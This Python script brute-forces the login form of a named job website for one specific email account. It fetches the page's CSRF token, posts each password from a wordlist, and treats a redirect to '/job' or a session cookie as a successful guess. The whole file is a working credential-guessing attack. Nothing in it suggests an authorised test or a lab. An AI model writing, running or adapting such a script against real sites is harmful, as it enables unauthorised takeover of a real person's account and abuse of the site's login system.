import requests, time, re

url = "https://workupjob.com/login"
username = "jobayerkhanxyz0000@gmail.com"
wordlist = "passwords.txt"

session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0"})

print("[*] Getting CSRF token...")
resp = session.get(url)
m = re.search(r'name="_token" value="([^"]+)"', resp.text)
if not m:
    print("[-] CSRF token not found. Aborting.")
    exit()
csrf = m.group(1)
print(f"[+] Token: {csrf}\n")

with open(wordlist) as f:
    for pwd in f:
        pwd = pwd.strip()
        print(f"[*] Trying password: {pwd}")

        data = {
            "_token": csrf,
            "login_email": username,
            "login_password": pwd,
            "login_do": "Login"
        }

        try:
            resp = session.post(url, data=data, allow_redirects=True, timeout=10)
            print(f"Status: {resp.status_code}, Final URL: {resp.url}")

            # Redirect history debug
            if resp.history:
                for r in resp.history:
                    print("  ▶ Redirect:", r.status_code, r.headers.get("Location"))

            # চেক: url, status, বা session cookie
            if resp.url.endswith("/job") or "session" in session.cookies.get_dict():
                print(f"[✅] Valid password found: {pwd}")
                break
            else:
                print(f"[-] Invalid: {pwd}")
                snippet = resp.text[:300].replace("\n"," ")
                print("[Snippet]:", snippet)
            time.sleep(1)

        except Exception as e:
            print(f"[!] Exception: {e}")
